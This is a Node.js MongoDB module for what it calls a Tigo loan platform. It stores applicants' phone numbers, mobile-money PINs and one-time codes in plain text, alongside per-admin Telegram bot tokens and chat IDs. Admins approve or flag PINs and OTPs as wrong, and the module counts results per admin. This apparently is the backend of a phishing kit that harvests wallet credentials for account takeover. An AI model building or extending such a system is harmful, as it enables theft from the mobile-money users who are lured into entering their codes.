const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = 'tigo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications'
};

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;
        
        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }
        
        console.log('🔄 Connecting to MongoDB...');
        
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        
        db = client.db(DB_NAME);
        
        console.log('✅ Connected to MongoDB successfully');
        
        // Create indexes for better performance
        await createIndexes();
        
        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        // Admin indexes
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        
        // Application indexes
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
        
        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

/**
 * Save admin to database
 */
async function saveAdmin(adminData) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).insertOne({
            adminId: adminData.id,
            name: adminData.name,
            email: adminData.email,
            botToken: adminData.botToken,
            chatId: adminData.chatId,
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        });
        
        console.log(`💾 Admin saved: ${adminData.id} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

/**
 * Get admin by ID
 */
async function getAdmin(adminId) {
    try {
        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        return admin;
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

/**
 * Get all admins
 */
async function getAllAdmins() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        return admins;
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

/**
 * Get active admins only
 */
async function getActiveAdmins() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
        return admins;
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

/**
 * Update admin status
 */
async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        
        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

/**
 * Delete admin
 */
async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

/**
 * Save application to database
 */
async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            otpStatus: appData.otpStatus || 'pending',
            otp: appData.otp || null,
            assignmentType: appData.assignmentType,
            timestamp: appData.timestamp || new Date().toISOString()
        });
        
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

/**
 * Get application by ID
 */
async function getApplication(applicationId) {
    try {
        const application = await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
        return application;
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

/**
 * Update application
 */
async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { 
                $set: { 
                    ...updates, 
                    updatedAt: new Date().toISOString() 
                } 
            }
        );
        
        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

/**
 * Get applications by admin ID
 */
async function getApplicationsByAdmin(adminId) {
    try {
        const applications = await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
        return applications;
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

/**
 * Get pending applications for admin
 */
async function getPendingApplications(adminId) {
    try {
        const applications = await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [
                    { pinStatus: 'pending' },
                    { otpStatus: 'pending' }
                ]
            })
            .sort({ timestamp: -1 })
            .toArray();
        return applications;
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

/**
 * Get admin statistics
 */
async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            adminId, 
            pinStatus: 'pending' 
        });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            adminId, 
            pinStatus: 'approved' 
        });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            adminId, 
            otpStatus: 'pending' 
        });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            adminId, 
            otpStatus: 'approved' 
        });
        
        return {
            total,
            pinPending,
            pinApproved,
            otpPending,
            fullyApproved
        };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

/**
 * Get system-wide statistics
 */
async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            pinStatus: 'pending' 
        });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            pinStatus: 'approved' 
        });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            otpStatus: 'pending' 
        });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            otpStatus: 'approved' 
        });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            $or: [
                { pinStatus: 'rejected' },
                { otpStatus: 'wrongpin_otp' },
                { otpStatus: 'wrongcode' }
            ]
        });
        
        return {
            totalAdmins,
            totalApplications,
            pinPending,
            pinApproved,
            otpPending,
            fullyApproved,
            totalRejected
        };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return {
            totalAdmins: 0,
            totalApplications: 0,
            pinPending: 0,
            pinApproved: 0,
            otpPending: 0,
            fullyApproved: 0,
            totalRejected: 0
        };
    }
}

/**
 * Get per-admin statistics
 */
async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return {
                adminId: admin.adminId,
                name: admin.name,
                ...stats
            };
        });
        
        const stats = await Promise.all(statsPromises);
        return stats;
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// Export all functions
module.exports = {
    connectDatabase,
    closeDatabase,
    
    // Admin operations
    saveAdmin,
    getAdmin,
    getAllAdmins,
    getActiveAdmins,
    updateAdminStatus,
    deleteAdmin,
    
    // Application operations
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    
    // Statistics
    getAdminStats,
    getStats,
    getPerAdminStats
};